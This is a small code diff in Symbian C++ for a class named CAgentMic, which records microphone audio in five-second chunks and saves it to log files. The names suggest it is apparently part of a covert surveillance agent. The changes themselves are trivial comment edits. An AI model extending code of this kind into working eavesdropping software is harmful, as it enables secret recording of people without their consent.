@@ -49,7 +49,6 @@ CAgentMic::CAgentMic() :
 
 CAgentMic::~CAgentMic()
 	{
-	//delete iFreeSpaceMonitor;
 	delete iCallMonitor;
 	delete iTimer;
 	
@@ -247,11 +246,11 @@ void CAgentMic::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 			iFramesCounter++;
 			if(iFramesCounter == KFrameCountAMR)
 				{
+				// 5 sec has been recorded, save log...
 				TInt value;
 				RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
 				if(value)
 					{
-					// 5 sec has been recorded, save log...
 					CLogFile* logFile = CLogFile::NewLC(iFs);
 					logFile->CreateLogL(LOGTYPE_MIC, &iMicAdditionalData);
 					logFile->AppendLogL(*iRecData);
